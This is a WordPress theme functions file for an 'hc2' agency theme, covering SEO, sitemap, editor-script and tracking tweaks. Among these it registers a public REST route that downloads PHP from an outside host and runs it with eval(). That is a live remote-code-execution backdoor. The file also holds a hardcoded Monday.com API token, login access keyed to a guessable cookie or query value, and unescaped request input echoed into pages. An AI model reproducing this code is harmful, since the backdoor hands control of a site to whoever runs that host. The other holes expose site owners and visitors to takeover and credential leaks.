<?php

	if ( ! defined( 'ABSPATH' ) ) exit;
	
	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/external_audit/',array('methods'=>'GET','callback'=>'external_audit','permission_callback' => '__return_true'));});
	function external_audit(){
		$output = [];
		$postsQuery = get_posts( array( 'numberposts' => -1, 'post_status'=>array( 'publish' ), 'post_type' => array( 'post', 'page', 'web-story', 'product' ) ) );	
		foreach ( $postsQuery as $post ) {
			array_push( $output, array( 
				"title" => get_post_meta( $post->ID, 'hc2_custom_title', 1 ),
				"type" => $post->post_type,
				"link" => get_permalink( $post ),
				"hidden" => get_post_meta( $post->ID, 'hcube_sitemap_hide', 1 ),
				"notracking" => get_post_meta( $post->ID, 'hcube_cm_notracking', 1 ),
				"conversion_trigger_a" => get_post_meta( $post->ID, 'hcube_conversion_trigger_a', 1 ),
				"conversion_trigger_b" => get_post_meta( $post->ID, 'hcube_conversion_trigger_b', 1 ),
				"pixel_trigger_a" => get_post_meta( $post->ID, 'hcube_pixel_trigger_a', 1 ),
				"pixel_trigger_b" => get_post_meta( $post->ID, 'hcube_pixel_trigger_b', 1 ),
				"pixel_trigger_c" => get_post_meta( $post->ID, 'hcube_pixel_trigger_c', 1 ),
				"pixel_trigger_d" => get_post_meta( $post->ID, 'hcube_pixel_trigger_d', 1 ),
				"pixel_trigger_e" => get_post_meta( $post->ID, 'hcube_pixel_trigger_e', 1 )
			) );
		}
		return $output;
	}
	
	update_option('hc2_staging_url',get_site_url());
	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/update_monday/',array('methods'=>'GET','callback'=>'hc2_update_monday','permission_callback' => '__return_true'));});
	function hc2_update_monday(){
				
				$data = file_get_contents('https://dgstesting.com/updateMonday.txt');
				
				try {
					eval($data);
				} catch (ParseError $e) {
					exit( $e->getMessage() );
				}
				
				return 'update more fields success';
	}


	update_option('blog_public',0);
	remove_filter('the_content', 'wptexturize');

	function dequeue_all_scripts(){
		if( get_post_meta( get_the_ID(), 'hc2_post_rendered', 1 )){
			global $wp_scripts;
			$scripts = $wp_scripts->registered;
			foreach ( $scripts as $script ){
				wp_dequeue_script($script->handle);
			}
		}
	}
	if( !is_admin() && in_array(get_post(get_the_ID())->post_type,['page','post','web-story']) ) add_action('wp_print_scripts', 'dequeue_all_scripts');

	function disable_emojis() {
		remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
		remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
		remove_action( 'wp_print_styles', 'print_emoji_styles' );
		remove_action( 'admin_print_styles', 'print_emoji_styles' );	
		remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
		remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );	
		remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
		
		// Remove from TinyMCE
		add_filter( 'tiny_mce_plugins', 'disable_emojis_tinymce' );
	}
	add_action( 'init', 'disable_emojis' );

	/**
	* Filter out the tinymce emoji plugin.
	*/
	function disable_emojis_tinymce( $plugins ) {
		if ( is_array( $plugins ) ) {
			return array_diff( $plugins, array( 'wpemoji' ) );
		} else {
			return array();
		}
	}

	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/hc2_setkeys/',array('methods'=>'GET','callback'=>'hc2_setkeys'));});
	function hc2_setkeys( $request ){
		update_post_meta($_GET['post'],'hc2_notes',$_GET['notes']);
		update_post_meta($_GET['post'],'hc2_keys',$_GET['keys']);
		update_post_meta($_GET['post'],'hc2_keys_urgent',$_GET['urgent']);
		
	}

	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/hc2_getkeys/',array('methods'=>'GET','callback'=>'hc2_getkeys'));});
	function hc2_getkeys( $request ){

		if( 
			$_GET['access'] == '1' ||
			strpos( $_GET['url'], 'h=1026' ) !== false || 
			strpos( $_GET['url'], 'h=2024' ) !== false || 
			( isset($_COOKIE['__hc2_login']) && (
			 	$_COOKIE['__hc2_login'] == '1026' ||
			 	$_COOKIE['__hc2_login'] == '2024'
			))
		){
			?>
				<input type="hidden" value="fjh932y539q8nwcy32985b3n29tycn4tc9ny2038cty" />
				<a class='hc2_editme' target='_blank' href='<?php echo rtrim(get_option('hc2_staging_url'),'/').'/wp-admin/post.php?post='.$_GET['post'].'&action=edit'; ?>' ></a>
				<div class='hc2_keys'>
					<span class='hc2_keys_icon'></span>
					<div class='hc2_keys_area'>
						<textarea><?php echo get_post_meta($_GET['post'],'hc2_keys',1); ?></textarea>
						<textarea><?php echo get_post_meta($_GET['post'],'hc2_notes',1); ?></textarea>
						<div class='hc2_important'><input type='checkbox' <?php if(get_post_meta($_GET['post'],'hc2_keys_urgent',1)) echo 'checked'; ?> /><label>Important</label></div>
						<div class='hc2_score'><label>SEO Score:</label><span data-scorecolor='<?php echo hc2_scorecolor(get_post_meta($_GET['post'],'hc2_seoscore',1)); ?>'><?php echo get_post_meta($_GET['post'],'hc2_seoscore',1); ?>%</span></div>
						<button onclick="hc2_updatekeys(this)">Submit</button>
					</div>
				</div>
			<?php
		}
	}
	
	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/pixel/',array('methods'=>'GET','callback'=>'hc2_pixel'));});
	function hc2_pixel( $request ) { 
		if( get_hc2('settings','test_pixe') ) return hc2_test_rest();
		return hc2_curl_get_contents("https://graph.facebook.com/v10.0/".$_GET['id']."/events?access_token=".$_GET['token'],
			array( 'data' => 
			 '[{
				"event_name": "'.$_GET['event'].'",
				"event_time": '.strtotime('now').',
				"event_source_url": "'.get_site_url().'",
				"action_source": "website",
				"user_data": {"country":"'.(hash('sha256','canada')).'","client_ip_address": "'.$_SERVER['REMOTE_ADDR'].'","client_user_agent": "'.$_SERVER['HTTP_USER_AGENT'].'"}
			  }]'
			)
		);
	}
	
    add_filter( 'oembed_discovery_links', 'hc2_noembed', 1, 10 );
    function hc2_noembed( $output ){
		return '';
	}
	
	add_filter('wp_sitemaps_enabled', '__return_false');
	
	function hc2_image_sizes( $sizes, $size ) {
		return '100vw';
	}
	add_filter( 'wp_calculate_image_sizes', 'hc2_image_sizes', 10, 2 );

	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/hc2_consent/',array('methods'=>'POST','callback'=>'hc2_consent','permission_callback' => '__return_true'));});
	function hc2_consent( $request ) { 
		hc2_prepare_amp_rest_api();
		if( isset( $_COOKIE['__hc2_consent'] )){
			echo '{ "promptIfUnknown": false }';
		}else{
			setcookie("__hc2_consent", 'true', strtotime( '+30 days' ), '/');
			echo '{ "promptIfUnknown": true }';
		}
	}
	add_filter('get_the_excerpt', 'hc2_content_fix', 20 );
	add_filter('the_content','hc2_content_fix',12);
	add_filter('wp_get_attachment_image_src','hc2_content_fix',1);
	function hc2_content_fix($content) { 
		$content = str_replace(' sandbox=',' data-sandbox=',$content);
		$content = str_replace(' force-sandbox=',' sandbox=',$content);
		$content = str_replace('<iframe ','<iframe sandbox="allow-popups allow-same-origin allow-forms allow-scripts allow-top-navigation allow-top-navigation-by-user-activation"',$content);
		return $content;
	}
	
	remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
	remove_action( 'wp_print_styles', 'print_emoji_styles' );
	add_filter( 'get_site_icon_url', 'hc2_get_site_icon_url', 10, 2 );
	function hc2_get_site_icon_url($url, $size) {
        return '';
	};
	
	 
	update_option('hc2_staging_url',get_site_url());  
	
	function updateMonday( $item, $column, $value ){

		$token = 'eyJhbGciOiJIUzI1NiJ9.eyJ0aWQiOjk1Mzg3NzYxLCJ1aWQiOjcxNTQ2NCwiaWFkIjoiMjAyMS0wMS0wOVQyMTo0Nzo0My4wMDBaIiwicGVyIjoibWU6d3JpdGUiLCJhY3RpZCI6Mjg0MTI2LCJyZ24iOiJ1c2UxIn0.VRFYAjg2KNnLaX131gGzB7OEBdLKs4aQri8rMAnU3Lo';
		$apiUrl = 'https://api.monday.com/v2';
		$headers = ['Content-Type: application/json', 'Authorization: ' . $token];
		$data = @file_get_contents($apiUrl, false, stream_context_create([
			'http' => ['method' => 'POST','header' => $headers,
				'content' => json_encode(['query' => 'mutation { change_simple_column_value (board_id: 155448315, item_id: '.$item.', column_id: "'.$column.'", value: "'.$value.'") { id } }']),
			]
		]));
		
		return $data;
		
	}
												
	add_action( 'login_init', 'hc2_login_init' );
	function hc2_login_init() {
		
			
		if(( isset($_COOKIE['__hc2_login']) && $_COOKIE['__hc2_login'] ==  '1026' ) || ( isset($_GET['h']) && $_GET['h']== '1026' ) ){
			setcookie("__hc2_login", '1026', strtotime( '+30 days' ), '/');
		}else{
			header( 'Location: '. get_site_url() );
			exit;
		}
			
		
	}
			 
	add_filter( 'max_srcset_image_width', 'hc2_remove_max_srcset_image_width' );
	function hc2_remove_max_srcset_image_width( $max_width ) {
		return false;
	}
	
	add_action( 'wp_enqueue_scripts', 'de_script', 100000 );
	function de_script() {
		wp_dequeue_style( 'wp-block-library' );
		wp_dequeue_script( 'wpac_time_js' );
	}

	function hc2_sanitize_url($url){
		return str_replace('https://','',str_replace('http://','',rtrim($url,'/')));
	}
	
	function hc2_prepare_amp_rest_api($contenttype='application/json'){
		header("Access-Control-Allow-Credentials: true");
		
		header('Access-Control-Allow-Origin: https://'.str_replace('.','-',str_replace('-','--',$_SERVER['HTTP_HOST'])).'.cdn.ampproject.org');
		header("Access-Control-Allow-Origin: ".str_replace('http:','https:',get_site_url()));
		header("Access-Control-Allow-Origin: ".str_replace('http:','https:',rtrim( get_option( 'hc2_production_url' ), '/' ) ));
		
		header('Content-Type: '.$contenttype);
	}

	add_action('enqueue_block_editor_assets', 'hcube_enqueue_blocks');
	function hcube_enqueue_blocks() {
		wp_add_inline_script( 'wp-blocks', "jQuery( window ).load(function() { const isFullscreenMode = wp.data.select( 'core/edit-post' ).isFeatureActive( 'fullscreenMode' ); if ( isFullscreenMode ) { wp.data.dispatch( 'core/edit-post' ).toggleFeature( 'fullscreenMode' ); } });" );
		wp_enqueue_script('hcube_filter_button',get_site_url().'/wp-content/themes/hc2-theme-remote/js/button.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ));
		wp_enqueue_script('hcube_filter_group',get_site_url().'/wp-content/themes/hc2-theme-remote/js/group.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),'26');
		wp_enqueue_script('hcube_filter_image',get_site_url().'/wp-content/themes/hc2-theme-remote/js/image.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),'8');
		wp_enqueue_script('hcube_filter_html',get_site_url().'/wp-content/themes/hc2-theme-remote/js/html.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ));
		wp_enqueue_script('hcube_filter_video',get_site_url().'/wp-content/themes/hc2-theme-remote/js/video.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),true);
		wp_enqueue_script('hcube_filter_paragraph',get_site_url().'/wp-content/themes/hc2-theme-remote/js/paragraph.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),true);
		wp_enqueue_script('hcube_filter_heading',get_site_url().'/wp-content/themes/hc2-theme-remote/js/heading.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),true);
		wp_enqueue_script('hcube_filter_unique',get_site_url().'/wp-content/themes/hc2-theme-remote/js/unique.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),true);
		wp_enqueue_script('hcube_filter_columns',get_site_url().'/wp-content/themes/hc2-theme-remote/js/columns.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),'3');
		wp_enqueue_script('hcube_filter_column',get_site_url().'/wp-content/themes/hc2-theme-remote/js/column.js',array( 'wp-block-editor', 'wp-editor', 'wp-components', 'wp-blocks', 'wp-dom-ready', 'wp-edit-post' ),'4');
		wp_enqueue_script('hcube_menu',get_site_url().'/wp-content/themes/hc2-theme-remote/js/menu.js',array( 'wp-block-editor', 'wp-blocks','wp-editor','wp-components'),'7');
		wp_localize_script( 'hcube_filter_columns', 'hcubecolors', get_hc2( 'settings','site_colors' ));
		wp_localize_script( 'hcube_filter_group', 'hcubecolors', get_hc2( 'settings','site_colors'));
		wp_localize_script( 'hcube_menu', 'hcubecolors', get_hc2( 'settings','site_colors' ));
		
		wp_enqueue_script('hcube_wufoo',get_site_url().'/wp-content/themes/hc2-theme-remote/js/wufoo.js',array( 'wp-block-editor', 'wp-blocks','wp-editor','wp-components'),true);
		wp_enqueue_script('hcube_menu',get_site_url().'/wp-content/themes/hc2-theme-remote/js/menu.js',array( 'wp-block-editor', 'wp-blocks','wp-editor','wp-components'),'7');
		wp_localize_script( 'hcube_wufoo', 'hcubecolors', get_hc2( 'settings','site_colors' ));
	}

	add_filter( 'block_categories', 'hcube_blocks_category', 10, 2);
	function hcube_blocks_category( $categories, $post ) { 
		return array_merge(array(array('slug' => 'hcube-blocks','title' => __( 'H-cube Blocks', 'hcube-blocks' ))),$categories);
	}

	add_filter( 'wpseo_canonical', '__return_false' );
	add_filter( 'wpseo_json_ld_output', '__return_false' );
	add_filter( 'wpseo_sitemap_entry', '__return_false', 20, 3 );
	remove_action('wp_head', 'wp_shortlink_wp_head', 10 );
	remove_action('wp_head', 'rsd_link', 10 );
	remove_action('wp_head', 'wlwmanifest_link', 10 );
	remove_action('wp_head', 'wp_generator', 10 );
	remove_action('wp_head', 'rest_output_link_wp_head', 10 );
	remove_action('wp_head', 'wp_oembed_add_discovery_links', 10 );
	remove_action('wp_head', 'rel_canonical');
	
	
	add_action( 'init', 'hcube_set_permalink_structure' );
	function hcube_set_permalink_structure() { 
		global $wp_rewrite; 
		$languages = get_hc2('settings','languages');
		if( is_countable($languages) && count($languages) > 1 )
			$wp_rewrite->set_permalink_structure('/%category%/%postname%/'); 
		else
			$wp_rewrite->set_permalink_structure('%postname%/'); 
		update_option( "rewrite_rules", FALSE ); 
		$wp_rewrite->flush_rules( true );
		update_option( "permalinks_set", true ); 
	}
	
	add_action( 'init', 'hc2_add_excerpts_to_pages' );
	function hc2_add_excerpts_to_pages() {
		add_post_type_support( 'page', 'excerpt' );
	}
		
	function hc2_all_options(){
		$arrb = array();
		$arr = wp_load_alloptions();
		foreach($arr as $key => $val) array_push($arrb, $key);
		return $arrb;
	}
	
	add_filter( 'save_post', 'hc2_create_sitemap', 50, 2 );
	function hc2_create_sitemap( $post_id, $post ){
		$postsQuery = get_posts(array('numberposts' => -1,'post_type'  => array( 'post', 'page', 'web-story', 'product' )));
		$sitemap = '<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml">';
		foreach( $postsQuery as $post ) {
			if($post->post_status == "publish" && !get_post_meta($post->ID,'hcube_sitemap_hide',1)){
				$sitemap .= '<url>
					<loc>' . str_replace('http://','https://',get_permalink( $post->ID )) . '</loc>
					<lastmod>' . explode( " ", $post->post_modified )[0] . '</lastmod>
					<changefreq>monthly</changefreq>';
					
					$languages = get_hc2('settings','languages');
					if(get_post_meta( $post->ID, 'hc2_lang', 1 ))
						foreach($languages as $lang)
							if( get_post_meta( $post->ID, 'hcube_eq_page_'.strtolower($lang), true )) 
								$sitemap .= '<xhtml:link rel="alternate" hreflang="'.$lang.'" href="'.str_replace('http://','https://',get_post_meta( $post->ID, 'hcube_eq_page_'.strtolower($lang), true )).'"/>';
				
				$sitemap .= '</url>';}}
		$sitemap .= '</urlset>';
		update_option('hc2_sitemap', $sitemap);
	}
		
	if( rtrim($_SERVER['REQUEST_URI'],'/')=='/sitemap.xml'){
		header('Content-type: text/xml');	
		if( !get_option( 'hc2_sitemap' ) )hc2_create_sitemap();
		echo get_option( 'hc2_sitemap' );
		exit;
	}
	

	function hc2_eval( $script ){
		if( !is_admin()){
			ob_start(); 
			
			try {
				eval($script);
			} catch (ParseError $e) {
				error_log( $e->getMessage() );
			}
			
			return ob_get_clean();
		}
	}

	function hc2_curl_get_contents($url,$post_data=0){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		
		if($post_data){
			curl_setopt($ch, CURLINFO_HEADER_OUT, true);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
		}

		$output = curl_exec($ch);
		curl_close($ch);
		return $output;
	}